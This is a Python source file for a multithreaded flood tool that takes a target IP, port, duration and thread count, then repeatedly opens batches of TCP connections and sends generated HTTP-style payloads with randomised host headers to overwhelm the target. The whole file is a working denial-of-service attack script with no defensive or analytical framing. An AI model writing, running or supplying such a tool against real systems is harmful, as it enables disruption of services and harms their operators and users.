from socket import socket, AF_INET, SOCK_STREAM
import threading, random, time, sys
from utils import *

def flood_thread(ip: str, port: int, duration: int):
    
    def generate_sockets():
        socket_list: list[socket] = []
        for i in range(32):
            try:
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((ip, port))
                socket_list.append(s)
            except Exception:
                continue
        return socket_list

    def attack():
        end_time = time.time() + duration
        while time.time() < end_time:
            socket_list = generate_sockets()
            for sock in socket_list:
                try:
                    for i in range(5):
                        payload = generate_payload(random.choice(host_list), b"/")
                        sock.sendall(payload)

                    sock.close()
                except Exception:
                    continue

                if time.time() >= end_time:
                    break
    attack()

def start_flood(ip: str, port: int, duration: int, thread_count: int):
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=flood_thread, args=(ip, port, duration))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <IP> <PORT> <DURATION> <THREADS>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    attack_duration = int(sys.argv[3])
    thread_count = int(sys.argv[4])

    start_flood(target_ip, target_port, attack_duration, thread_count)
